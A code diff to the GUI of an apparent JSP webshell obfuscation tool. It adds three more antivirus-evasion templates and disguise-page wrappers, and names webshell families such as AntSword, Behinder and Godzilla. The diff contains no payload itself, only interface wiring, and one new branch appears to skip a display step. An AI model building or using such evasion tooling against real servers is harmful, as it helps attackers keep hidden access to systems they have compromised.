@@ -33,6 +33,9 @@ public class JspPanel {
         status.addItem("jsp_demo2");
         status.addItem("jsp_demo3");
         status.addItem("jsp_demo4");
+        status.addItem("jsp_demo5");
+        status.addItem("jsp_demo6");
+        status.addItem("jsp_demo7");
 
         status.addActionListener(new AbstractAction() {
             @Override
@@ -49,6 +52,15 @@ public class JspPanel {
                         break;
                     case "jsp_demo4":
                         txtArea.setText(JspEncodeDemo4.GetDemotxt());
+                        break;
+                    case "jsp_demo5":
+                        txtArea.setText(JspEncodeDemo5.GetDemotxt());
+                        break;
+                    case "jsp_demo6":
+                        txtArea.setText(JspEncodeDemo6.GetDemotxt());
+                        break;
+                    case "jsp_demo7":
+                        txtArea.setText(JspEncodeDemo7.GetDemotxt());
                         break;
                     default:
                         encodeArea.setText("请选择jsp免杀模板");
@@ -120,6 +132,32 @@ public class JspPanel {
                         jspdemo[0] += new HtmlPretend().GetJsp9((String) pretend.getSelectedItem());
                         txtArea.setText(jspdemo[1]);
                         break;
+                    case "jsp_demo5":
+                        try {
+                            jspdemo = new JspEncodeDemo5((String) status.getSelectedItem(), jTextField.getText(), sourcecodeArea.getText()).Run();
+                        } catch (Exception ex) {
+                            ex.printStackTrace();
+                        }
+                        jspdemo[0] += new HtmlPretend().GetJsp9((String) pretend.getSelectedItem());
+                        txtArea.setText(jspdemo[1]);
+                        break;
+                    case "jsp_demo6":
+                        try {
+                            jspdemo = new JspEncodeDemo6((String) status.getSelectedItem(), jTextField.getText(), sourcecodeArea.getText()).Run();
+                        } catch (Exception ex) {
+                            ex.printStackTrace();
+                        }
+                        jspdemo[0] += new HtmlPretend().GetJsp7((String) pretend.getSelectedItem());
+                        txtArea.setText(jspdemo[1]);
+                        break;
+                    case "jsp_demo7":
+                        try {
+                            jspdemo = new JspEncodeDemo7((String) status.getSelectedItem(), jTextField.getText(), sourcecodeArea.getText()).Run();
+                        } catch (Exception ex) {
+                            ex.printStackTrace();
+                        }
+                        jspdemo[0] += new HtmlPretend().GetJsp9((String) pretend.getSelectedItem());
+                        break;
                     default:
                         jspdemo = new String[]{"请选择jsp免杀模板",""};
                 }
@@ -140,7 +178,7 @@ public class JspPanel {
         JPanel sourcecodeJpanel = new JPanel(new BorderLayout());
         sourcecodeArea = new JTextArea();
         sourcecodeArea.setText("<% out.println(\"hello world\");%>\n" +
-                "//jsp源码：一句话、蚁剑、冰蝎、哥斯拉或其他webshell源码");
+                "<%//jsp源码：一句话、蚁剑、冰蝎、哥斯拉或其他webshell源码%>");
         JScrollPane scrollPane1 = new JScrollPane(sourcecodeArea);
         sourcecodeJpanel.add(scrollPane1);
 
